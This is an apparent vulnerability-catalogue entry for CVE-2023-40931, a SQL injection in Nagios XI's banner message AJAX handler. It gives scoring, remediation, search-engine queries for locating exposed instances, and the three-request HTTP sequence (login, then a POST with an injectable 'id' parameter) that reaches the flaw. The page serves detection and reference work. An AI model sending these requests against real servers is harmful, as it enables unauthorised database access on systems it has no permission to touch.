---
layout: post
cve_id: CVE-2023-40931
title: Nagios XI v5.11.0 - SQL Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-40931.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-40931.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: medium
impact: 'Successful exploitation of this vulnerability allows an authenticated attackers
  to execute arbitrary SQL commands.

  '
remediation: 'Upgrade Nagios XI to a patched version or apply the vendor-supplied
  patch to mitigate this vulnerability.

  '
reference:
- https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c
- https://nvd.nist.gov/vuln/detail/CVE-2023-40931
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 6.5
  cve-id: CVE-2023-40931
  cwe-id: CWE-89
  epss-score: 0.86844
  epss-percentile: 0.99402
  cpe: cpe:2.3:a:nagios:nagios_xi:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 3
  vendor: nagios
  product: nagios_xi
  shodan-query: title:"Nagios XI"
  fofa-query: app="nagios-xi"
  google-query: intitle:"nagios xi"
tags:
- cve2023
- cve
- authenticated
- nagiosxi
- sqli
- nagios
- vuln
---

## üîç Vulnerability Description
A SQL injection vulnerability in Nagios XI from version 5.11.0 up to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to /nagiosxi/admin/banner_message-ajaxhelper.php.


## üåê HTTP Request
```nohighlight
GET /nagiosxi/login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /nagiosxi/login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
Content-Length: 56
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
nsp=EUrF3g&pageopt=login&username=gZA7VS&password=ct0mt7
```

```nohighlight
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
action=acknowledge_banner_message&id=*
```

